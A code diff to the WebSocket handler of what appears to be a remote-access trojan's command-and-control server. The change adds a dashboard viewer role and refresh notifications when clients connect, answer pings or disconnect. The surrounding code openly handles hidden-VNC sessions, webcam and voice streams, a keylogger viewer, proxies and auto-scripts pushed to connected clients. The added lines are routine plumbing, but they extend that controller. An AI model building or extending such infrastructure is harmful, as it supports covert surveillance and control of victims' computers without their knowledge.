@@ -32,6 +32,7 @@ type WsLifecycleDeps = {
   hvncStreamingState: Map<string, unknown>;
   webcamStreamingState: Map<string, unknown>;
   getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number };
+  handleDashboardViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleConsoleViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleRemoteDesktopViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleWebcamViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
@@ -81,12 +82,14 @@ type WsLifecycleDeps = {
   clearPendingNotificationScreenshots: (clientId: string) => void;
   notifyRemoteDesktopStatus: (clientId: string, status: string, reason?: string) => void;
   handleBuildTagConnection: (clientId: string, buildTag: string) => void;
+  notifyDashboard: () => void;
 };
 
 export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLifecycleDeps): void {
   const role = ws.data.role as string;
   const clientId = ws.data.clientId;
   const ip = ws.data.ip;
+  if (role === "dashboard_viewer") return deps.handleDashboardViewerOpen(ws);
   if (role === "console_viewer") return deps.handleConsoleViewerOpen(ws);
   if (role === "rd_viewer") return deps.handleRemoteDesktopViewerOpen(ws);
   if (role === "webcam_viewer") return deps.handleWebcamViewerOpen(ws);
@@ -125,6 +128,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "client") {
     deps.notifyRemoteDesktopStatus(id, "online");
     metrics.recordConnection();
+    deps.notifyDashboard();
   }
 }
 
@@ -154,6 +158,7 @@ export function handleWebSocketMessage(
   if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
   if (socketRole === "voice_viewer") return deps.handleVoiceViewerMessage(ws, message);
   if (socketRole === "notifications_viewer") return;
+  if (socketRole === "dashboard_viewer") return;
 
   const { clientId, ip } = ws.data;
   const info = clientManager.getClient(clientId);
@@ -176,6 +181,7 @@ export function handleWebSocketMessage(
         handleHello(info, payload, ws, ip);
         clientManager.addClient(info.id, info);
         deps.dispatchAutoScriptsForConnection(info, ws);
+        deps.notifyDashboard();
         if (info.role === "client") {
           const wasKnown = Boolean((ws as any)?.data?.wasKnown);
           logAudit({
@@ -201,6 +207,7 @@ export function handleWebSocketMessage(
         break;
       case "pong":
         handlePong(info, payload);
+        deps.notifyDashboard();
         break;
       case "frame":
         if ((payload as any)?.header?.fps === 0) {
@@ -447,12 +454,18 @@ export function handleWebSocketClose(
     return;
   }
 
+  if (role === "dashboard_viewer") {
+    sessionManager.deleteDashboardSession(ws.data.sessionId || clientId);
+    return;
+  }
+
   clientManager.deleteClient(clientId);
   stopAllProxiesForClient(clientId);
   clearClientSyncState(clientId);
   deps.notifyConsoleClosed(clientId, "Client disconnected");
   setOnlineState(clientId, false);
   deps.clearPendingNotificationScreenshots(clientId);
+  deps.notifyDashboard();
   logger.info(`[close] ${clientId} code=${code} reason=${reason}`);
 
   if (role === "client") {
